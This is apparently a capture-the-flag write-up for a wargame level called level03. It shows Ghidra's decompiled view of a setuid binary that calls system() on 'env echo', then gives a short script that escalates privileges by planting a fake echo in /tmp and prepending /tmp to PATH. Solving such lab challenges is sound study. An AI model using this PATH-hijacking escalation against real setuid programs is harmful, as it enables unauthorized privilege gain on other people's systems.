Inside home folder, there is a binary file, level03.
Decompiling with Ghidra, we get this main function:

int main(int argc,char **argv,char **envp)

{
  __gid_t __rgid;
  __uid_t __ruid;
  int ret;
  gid_t gid;
  uid_t uid;
  
  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid,__rgid,__rgid);
  setresuid(__ruid,__ruid,__ruid);
  ret = system("/usr/bin/env echo Exploit me");
  return ret;
}

./level03 has special permissions (+s) for user flag03
lets modify $PATH so we can execute a fake version of echo which redirects
to getflag

```
exploit=/tmp/echo
cat << EOF > $exploit
#!/bin/bash
/bin/getflag
EOF

export PATH=/tmp:$PATH
/bin/chmod +x $exploit
./level03
```
